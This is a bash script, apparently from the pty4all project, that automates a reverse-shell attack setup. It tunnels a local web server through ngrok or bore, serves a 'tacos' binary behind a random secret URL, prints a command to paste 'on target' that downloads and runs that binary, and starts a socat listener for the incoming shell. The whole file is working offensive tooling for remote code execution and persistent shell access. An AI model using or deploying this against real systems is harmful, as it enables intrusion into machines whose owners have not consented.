#!/bin/bash

# From https://github.com/laluka/pty4all
SHORTCUT=true

for i in "$@"; do
    case $i in
    --lport|-p)
        LPORT="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;
    --bore)
        BORE=true
        shift;shift;
        ;;
    --windows|-w)
        WINDOWS=true
        ;;
    --tmp)
        TACOS_IN_TMP=true
        ;;
    --no-shortcuts|-N)
        SHORTCUT=""
        ;;
    --help|-h)
        HELP=true
        ;;
    *)
        ;;
    esac
done

SCRIPTNAME=$(readlink -f "$0")
BASEDIR=$(dirname "$SCRIPTNAME")
source "${BASEDIR}/socat-common.sh"

if [[ -z "$LPORT" ]]; then
    LPORT=4444
fi

if [[ -z "$WEBPORT" ]]; then
    WEBPORT=9292
fi

if [[ "$HELP" ]]; then
    echo "Usage : $0 -p <socat_port>"
    echo -e "\t--bore to perform tunneling using bore instead of ngrok"
    echo -e "\t-w/--windows if target is a windows machine"
    echo -e "\t-p/--lport for the socat listener local port"
    echo -e "\t--webport for the gitar local port"
    echo -e "\t--no-shortcuts to disable /sh endpoint of gitar (use longer command)"
    echo -e "\t--tmp if RCE is not in a writable directory, store tacos in /tmp/tacos (only for linux)"
    echo -e "\nUse this script with caution when you want to expose your listener behind an internet facing endpoint"
    exit 92
fi

check_tmux
set_binary_and_script "$BASEDIR" "$WINDOWS"
generate_tls_certs

cp ${SCRIPT}.tpl ${SCRIPT}

# Tunneling
TUNNEL_ENDPOINT=""
if [[ $BORE ]]; then
    echo "[+] Launch bore tunneling"
    tmux split-window -v "bore local ${WEBPORT} --to bore.pub"
    printf "\033[1;36mplease enter bore.pub remote_port given? \033[0m"
    read BPORT
    TUNNEL_ENDPOINT="bore.pub:${BPORT}"
else
    echo "[+] Launch ngrok tunneling"
    tmux split-window -v "ngrok tcp ${WEBPORT}"
    sleep 4
    NGROK_ENDPOINT_TCP=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r ".tunnels[0].public_url")
    NGROK_ENDPOINT="$(echo $NGROK_ENDPOINT_TCP | cut -d ':' -f 2-3 | cut -d '/' -f 3-)"
    TUNNEL_ENDPOINT="${NGROK_ENDPOINT}"
fi

# Launch gitar
echo "[+] launch gitar server"
SECRET=$RANDOM
tmux split-window -h "gitar -a https://${TUNNEL_ENDPOINT} -f ${LPORT} --secret ${SECRET}"
URL="http://${TUNNEL_ENDPOINT}/${SECRET}"

sed -i "/GITAR_SECRET/d" ${SCRIPT}

check_tacos_present "$BINARY"

echo "[+] Copy/paste following command on target and enjoy your meal:"

DOWNLOAD_URL="${URL}/pull/${BINARY}"
SHUTDOWN_URL="${URL}/shutdown"

REMOTE_CMD=$(build_remote_cmd "$DOWNLOAD_URL" "$BINARY" "$TUNNEL_ENDPOINT" "$WINDOWS" "$TACOS_IN_TMP" "$SHUTDOWN_URL")

if [[ "$SHORTCUT" ]]; then
    SHORTCUT_URL="${URL}/pull/sh"
    REMOTE_CMD=$(apply_shortcut "$REMOTE_CMD" "$SHORTCUT_URL")
fi

echo
if [[ "$WINDOWS" ]]; then
    echo -e "(W) ${REMOTE_CMD}"
else
    echo -e "(L) ${REMOTE_CMD}"
fi

start_socat_listener "$LPORT" "$SCRIPT" "$WINDOWS"
